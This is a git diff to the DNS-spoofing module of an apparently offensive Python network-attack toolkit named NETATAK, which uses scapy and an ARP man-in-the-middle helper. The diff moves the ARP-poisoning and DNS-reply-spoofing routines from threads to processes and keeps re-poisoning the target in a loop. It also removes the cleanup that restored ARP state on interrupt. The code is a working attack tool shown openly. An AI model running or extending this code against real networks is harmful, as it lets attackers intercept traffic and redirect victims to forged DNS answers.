@@ -24,6 +24,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 # THe spoof list can be found int atktools/config/spooflist
 
 import csv
+import multiprocessing
 from scapy.all import *
 from atktools import arp_mitm
 
@@ -73,22 +74,23 @@ class dnspoof:
             arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr)
             if not arp_start:
                 return False
-            arp_thread = threading.Thread(target=arp_start.find_targets, daemon=True)
+            arp_thread = multiprocessing.Process(target=arp_start.find_targets)
             arp_thread.start()
             time.sleep(15)
-            spoof_thread = threading.Thread(target=self.sniff_packets, daemon=True)
+            spoof_thread = multiprocessing.Process(target=self.sniff_packets)
             spoof_thread.start()
             print("{0}[*] NETATAK is now spoofing responses to DNS queries for {1}. Press CTRL+C to stop spoofing DNS responses and ARP poisoning.".format(B, self.target))
+            arp_thread.terminate()
             while True:
-                time.sleep(15)
                 arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr, verbose=0)
-                arp_thread = threading.Thread(target=arp_start.find_targets, daemon=True)
+                arp_thread = multiprocessing.Process(target=arp_start.find_targets)
                 arp_thread.start()
+                time.sleep(15)
+                arp_thread.terminate()
                 continue
         except (KeyboardInterrupt):
-            print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
-            stop_arp = arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr)
-            stop_arp.find_targets()
+            print("{0}[*] NETATAK is now stopping DNS Spoofing against {1}".format(B, self.target))
+            spoof_thread.terminate()
         except:
             print("{0}[*] NETATAK encountered an unexpected error whilst trying to conduct DNS spoofing. The error is: {1}.".format(R, sys.exc_info()[0]))
             print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
